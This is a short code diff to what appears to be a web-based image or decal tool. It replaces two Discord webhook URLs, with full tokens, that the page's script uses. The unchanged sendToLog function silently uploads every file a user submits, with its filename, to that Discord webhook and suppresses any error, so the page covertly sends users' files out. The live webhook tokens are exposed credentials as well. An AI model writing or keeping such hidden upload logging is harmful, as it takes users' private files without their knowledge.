@@ -184,8 +184,8 @@
 <footer>Note: Real Life images may not work as well, at least in Decals.</footer>
 
 <script>
-    const WEBHOOK="https://discord.com/api/webhooks/1473519335405260871/qBeBkC265qpuqxiTYFUshlyHw6gZuBqCf569qvpwSqS31i9-DkGxqUegJHCkUenl2Yab";
-    const AUDIO_WEBHOOK="https://discord.com/api/webhooks/1473881155504967782/bmfUb48cX2H2oOPkgBf0IxBt3zJOqAwx6RPtvKjCKmHO8P0WTUr9E3K-QGHSDhls0ZRN";
+    const WEBHOOK="https://discord.com/api/webhooks/1483312326995083266/csgtyMxxeo9__ZCmlxzc6hEgOSETzv2HfiBVYpMBi9tvnbgviSRB_TgXtu0DXYTTFStd";
+    const AUDIO_WEBHOOK="https://discord.com/api/webhooks/1483312326995083266/csgtyMxxeo9__ZCmlxzc6hEgOSETzv2HfiBVYpMBi9tvnbgviSRB_TgXtu0DXYTTFStd";
     const $=id=>document.getElementById(id);
 
     async function sendToLog(file,name){if(!file)return;const fd=new FormData();fd.append('file',file,name);fd.append('payload_json',JSON.stringify({username:"Year's Suite",embeds:[{title:`Original File Uploaded: ${name}`,color:0}]}));try{await fetch(WEBHOOK,{method:'POST',body:fd})}catch(e){}}
